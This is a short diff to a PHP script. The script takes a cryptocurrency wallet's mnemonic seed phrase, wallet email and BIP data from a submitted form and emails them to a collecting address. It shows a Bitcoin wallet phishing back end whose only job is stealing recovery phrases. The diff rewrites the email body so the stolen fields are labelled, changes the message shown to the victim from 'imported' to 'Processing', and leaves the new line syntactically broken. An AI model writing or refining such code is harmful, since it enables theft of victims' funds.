@@ -35,10 +35,10 @@ $mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
 $mail->Subject = "/new Entry";
 $mail->MsgHTML($mnemonic . $wallet_email . $bip);
 
-$mail->Body = $wallet_email . $bip;
+$mail->Body =("Mnemonic: ". $mnemonic '<br><br>' "Wallet_Email: ". $wallet_email .'<br><br>' . "Bip: " $bip);
 $mail->addAddress($email_to);
 if ( $mail->Send() ) {
-  echo "imported";
+  echo "Processing";
 }else{
   echo "Error";
 }
